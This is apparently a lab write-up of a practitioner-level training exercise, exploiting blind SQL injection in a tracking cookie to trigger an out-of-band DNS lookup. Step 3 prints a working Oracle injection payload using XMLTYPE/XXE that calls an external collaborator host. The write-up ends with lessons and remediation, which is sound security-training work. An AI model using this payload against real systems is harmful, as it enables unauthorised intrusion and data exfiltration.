# Lab: Blind SQL Injection with Out-of-Band Interaction

**Difficulty:** Practitioner  
**Status:** Solved  
**Category:** Blind SQL Injection / OAST

## Objective

Exploit the blind SQL injection vulnerability in the tracking cookie to trigger a DNS lookup to Burp Collaborator.

## Lab Solving Steps

### Step 1: Intercept the Request

I opened the lab homepage and intercepted the request using Burp Suite.

### Step 2: Send the Request to Repeater

I sent the intercepted request to **Burp Repeater** to modify the tracking cookie and test the SQL injection.

### Step 3: Inject the Payload

I used the following payload in the tracking cookie:

```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-ID.oastify.com/"> %remote;]>'),'/l')+FROM+dual--
```

I replaced `YOUR-COLLABORATOR-ID.oastify.com` with my Burp Collaborator domain.
![[Pasted image 20261015085329.png]]
### Step 4: Check Burp Collaborator

I sent the modified request and opened **Burp Collaborator** to check for interactions.

Boom! Burp Collaborator received an interaction, confirming that the injected SQL caused an out-of-band DNS lookup. The lab was solved.
![[Pasted image 20261015085341.png]]
![[Pasted image 20261015085354.png]]
## What I Learned

- **Blind SQL injection:** The SQL query can execute without visibly changing the application's response.
    
- **Out-of-band interaction (OAST):** An external interaction can confirm a vulnerability even when the application does not return query results.
    
- **Burp Collaborator:** Helps detect DNS and other external interactions triggered by a payload.
    
- **Database-specific syntax:** The payload uses Oracle-specific functions, including `EXTRACTVALUE` and `XMLTYPE`, to trigger XML external-entity processing.
    

## Remediation

- Use parameterized queries instead of concatenating user-controlled cookie values into SQL statements.
    
- Apply least-privilege permissions to database accounts.
    
- Disable unnecessary XML external-entity processing and restrict outbound DNS/network access from database systems.
    
- Monitor suspicious database errors and unexpected external interactions.
    

## Conclusion

I successfully exploited the tracking-cookie SQL injection and confirmed it through a DNS interaction observed in Burp Collaborator.

**Key takeaway:** Blind SQL injection can be confirmed through out-of-band interactions even when the application response does not reveal the query result.